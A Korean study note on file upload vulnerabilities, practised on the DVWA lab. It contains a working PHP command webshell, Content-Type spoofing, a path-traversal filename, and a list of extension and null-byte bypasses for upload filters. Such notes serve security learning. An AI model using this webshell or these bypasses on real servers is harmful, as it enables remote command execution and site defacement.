파일 업로드 취약점. exe 같은 악성 파일도 업로드 되면 취약점으로 보지만 php, asp, jsp 등 서버 사이드 언어 파일을 올려서 실행하는 것을 목적으로 함.

Webshell : 서버 사이드 언어를 활용해서 웹 서버의 쉘을 취득하는 악성코드.

---


파일 업로드 공격
1. 웹쉘 파일 올리기
2. 올린 파일의 위치를 찾고 해당 위치 url에 접속해서 파일을 실행
3. 실행에 성공해서 쉘 취득에 성공


파일 올릴 때
![](../Images/Pasted%20image%2020260803111203.png)

``` php
Content-Type: image/gif
```

webshell 파일 올릴 때
```php
Content-Type: application/octet-stream
-> Content-Type: image/gif 변경
```


**시나리오 1.**

업로드된 파일 실행
![](../Images/Pasted%20image%2020260803111935.png)

웹 쉘 탈취 가능


---


**시나리오 2.**
업로드 파일 실행

![](../Images/Pasted%20image%2020260803112502.png)


- HTTP 403.1 금지 - 실행 권한이 주어지지 않아 실행 실패.

해결 방법 : 파일 업로드 위치를 변경해준다.
```php
filename="../shellw7876.asp"
Content-Type: image/gif
```
이후, 다시 웹 쉘을 실행할 수 있게 된다.
>웹 쉘 탈취가 가능하여 정말 강력한 취약점이다 b.b


---

**시나리오 3

동일하게 파일 업로드 시 아래와 같은 alert 메시지 출력된다.

![](../Images/Pasted%20image%2020260803113150.png)


위 구현은 반드시 클라이언트가 아닌 서버에서 검증이 필요하다. 심지어 화이트리스트 방식이 아닌 블랙리스트 방식이기 때문에 문제점이 있다..!


**File Format Diverse**
- asp -> cer cdx asa cds
- php(애매) -> php3 php4 php5 html htm phtml inc
- jsp -> war jsf
- asp.net -> aspx asax ascx ashx asmx axd



```txt
취약점 이용한 우회
 ::$data 
 %00.jpg 
 ;.jpg 
 js%70 
 %2ejsp
 xxx.php.kr
 webshell.php::$data
 webshell.php%00.jpg
 webshell.jsp
```


**해결 방법**
파일 확장자를 .asa 변경시키면 파일 업로드 가능하다.



---

## Deface 웹 사이트 변조


```php
|   |
|---|
|<html>|
|<body>|
|<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">|
|<input type="TEXT" name="cmd" autofocus id="cmd" size="80">|
|<input type="SUBMIT" value="Execute">|
|</form>|
|<pre>|
|<?php|
|if(isset($_GET['cmd']))|
|{|
|system($_GET['cmd'] . ' 2>&1');|
|}|
|?>|
|</pre>|
|</body>|
|</html>|
```


아래 디렉토리로 webshell upload.
```bash
-rw-r--r--. 1 apache apache 10596 Aug  3 12:21 webshell.php
[user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php
-rw-r--r--. 1 apache apache 10596 Aug  3 12:21 /var/www/html/dvwa/hackable/uploads/webshell.php
[user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php

```

php 환경에서 /dvwa/hackable/uploads/webshell.php 접속 시 **탈취** 가능



```php
<?php  
  
if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );    // File information    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];    // Is it an image?    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&  
        ( $uploaded_size < 100000 ) &&        getimagesize( $uploaded_tmp ) ) {
```


**High Level 필터 기능**
1. png, jpeg, jpg
2. file size
3. image


**소스 코드 문제**
1. upload 경로 위치 ->  web root
2. 이미지 파일이기 때문에 100% 안전하지 않음